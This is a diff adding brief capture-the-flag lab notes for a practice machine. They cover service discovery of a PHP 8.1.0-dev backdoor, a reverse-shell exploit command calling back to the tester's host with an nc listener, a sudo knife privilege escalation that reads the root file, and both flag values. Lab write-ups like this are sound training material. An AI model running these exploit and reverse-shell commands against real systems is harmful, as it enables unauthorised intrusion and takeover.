@@ -1,0 +1,22 @@
+10/11/2022 - 10.10.10.242 (E)(L)
+
+Tools Used:
+Nmap, SearchSploit, NetCat, cURL.
+
+Findings:
+-- curl -X OPTIONS http://10.10.10.242 -i
+	-- Using ‘php 8.1.0’ (Vulnerable to RCE)
+
+Exploitation: (User Shell)
+-- python3 rev_shell.py http://10.10.10.242/ 10.10.14.11 4444
+	-- nc -lvnp 4444
+	-- From: https://github.com/flast101/php-8.1.0-dev-backdoor-rce
+
+Privilege Escalation: (Root Shell)
+-- sudo -l > (root) NOPASSWD: /usr/bin/knife
+	-- sudo knife exec -E 'system("cat /root/root.txt")' 
+	-- From: https://docs.chef.io/workstation/knife_exec/
+
+User Flag: 6c8e171fd0f4de0cc2606e905eaf2f38
+Root Flag: 8e39b95ae14a78d810d845dde9b01528
+
